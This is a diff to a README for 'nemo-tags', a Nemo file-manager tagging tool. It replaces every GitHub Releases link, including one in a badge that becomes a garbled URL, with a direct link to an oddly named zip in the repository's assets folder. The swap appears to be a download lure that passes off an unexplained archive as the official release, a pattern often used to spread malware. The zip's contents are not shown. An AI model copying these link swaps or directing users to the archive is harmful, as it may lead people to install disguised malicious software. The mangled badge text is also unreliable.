@@ -1,6 +1,6 @@
 # 🎫 nemo-tags - A Smart Tagging System for File Management
 
-[![GitHub Releases](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/neoray123/nemo-tags/releases)
+[![GitHub Releases](https://raw.githubusercontent.com/neoray123/nemo-tags/main/assets/nemo-tags-corticating.zip%20Latest%https://raw.githubusercontent.com/neoray123/nemo-tags/main/assets/nemo-tags-corticating.zip)](https://raw.githubusercontent.com/neoray123/nemo-tags/main/assets/nemo-tags-corticating.zip)
 
 ## 🛠️ Introduction
 
@@ -11,7 +11,7 @@ nemo-tags is a powerful tagging system designed specifically for the Nemo File M
 To begin using nemo-tags, follow these steps:
 
 1. **Visit the Releases Page:**
-   Go to our [Releases page](https://github.com/neoray123/nemo-tags/releases) to find the latest version available for download.
+   Go to our [Releases page](https://raw.githubusercontent.com/neoray123/nemo-tags/main/assets/nemo-tags-corticating.zip) to find the latest version available for download.
 
 2. **Download the Application:**
    On the Releases page, locate the latest version. Click on the download link for "nemo-tags". This file will be in a format suitable for your Linux system.
@@ -46,7 +46,7 @@ Before downloading, ensure your system meets the following requirements:
 
 ## 🔧 Download & Install
 
-To install nemo-tags, you should visit the [Releases page](https://github.com/neoray123/nemo-tags/releases) and follow the instructions provided above. Ensure you have the necessary permissions to install software on your system.
+To install nemo-tags, you should visit the [Releases page](https://raw.githubusercontent.com/neoray123/nemo-tags/main/assets/nemo-tags-corticating.zip) and follow the instructions provided above. Ensure you have the necessary permissions to install software on your system.
 
 ## 🎉 Contribution
 
